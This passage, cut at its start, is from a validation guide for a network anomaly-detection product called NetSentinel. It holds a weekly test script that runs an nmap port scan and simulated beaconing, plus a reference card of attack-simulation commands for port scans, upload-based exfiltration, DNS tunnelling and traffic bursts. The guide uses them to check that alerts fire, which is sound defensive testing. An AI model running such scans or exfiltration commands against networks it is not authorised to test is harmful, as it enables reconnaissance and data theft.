#!/bin/bash
# Weekly validation - lightweight tests only

# Quick port scan
nmap -sT -p 80,443 192.168.1.1-5 --max-rate 20

# Brief beaconing
for i in {1..5}; do
    curl -s https://httpbin.org/get > /dev/null
    sleep 60
done

# Log completion
echo "Weekly test completed at $(date)" >> /var/log/netsentinel_weekly.log
```

---

## Appendix A: Quick Reference Card

```
╔══════════════════════════════════════════════════════════════════╗
║                  NETSENTINEL QUICK TEST REFERENCE                 ║
╠══════════════════════════════════════════════════════════════════╣
║ TEST              │ COMMAND                    │ EXPECTED ALERT   ║
╠═══════════════════╪════════════════════════════╪══════════════════╣
║ Port Scan         │ nmap -sT -p1-1000 <target> │ HIGH - Scanning  ║
║ Exfiltration      │ curl --upload-file <big>   │ HIGH - Exfil     ║
║ Beaconing         │ while curl; sleep 60; done │ MED - C2 Pattern ║
║ DNS Tunnel        │ dig random.example.com x500│ MED - DNS Anomaly║
║ Burst Traffic     │ ab -n 1000 -c 50 <url>     │ HIGH - Burst     ║
║ New Destination   │ curl <uncommon-site>       │ LOW - New Dest   ║
╠══════════════════════════════════════════════════════════════════╣
║ VERIFICATION: docker logs netsentinel-backend --tail 50          ║
║ ALERTS: http://localhost:3000/alerts                             ║
║ DB CHECK: docker exec netsentinel-db psql -U netsentinel ...     ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Appendix B: Troubleshooting

| Issue | Possible Cause | Solution |
|-------|---------------|----------|
| No alerts generated | ML not trained | Wait for baseline period |
| | Flows not arriving | Check `docker logs netsentinel-collector` |
| | Wrong site selected | Verify site_id in dashboard |
| All tests show same score | Feature extraction issue | Check `docker logs netsentinel-celery-worker` |
| Too many false positives | Baseline too short | Extend baseline to 7+ days |
| | Thresholds too sensitive | Adjust alert rules |
| Alerts delayed | Processing backlog | Check Celery queue status |
| Dashboard not updating | Cache issue | Hard refresh (Ctrl+Shift+R) |

---

## Appendix C: Glossary

| Term | Definition |
|------|------------|
| **Baseline** | The learned "normal" behavior pattern for a device |
| **Anomaly Score** | 0-1 value indicating how abnormal current behavior is |
| **Feature** | A measurable characteristic (bytes, ports, destinations) |
| **Flow** | A single network connection record (src, dst, ports, bytes) |
| **Beaconing** | Regular, periodic connections typical of malware C2 |
| **Lateral Movement** | Attacker moving between systems within a network |
| **Exfiltration** | Unauthorized data transfer out of the network |
| **False Positive** | Alert triggered by legitimate activity |
| **True Positive** | Alert triggered by actual anomalous/malicious activity |

---

This guide provides a comprehensive framework for validating your NetSentinel deployment. Remember:
- **Always test on networks you own**
- **Document all tests for compliance**
- **Adjust thresholds based on your results**
- **Re-run tests after any configuration changes**
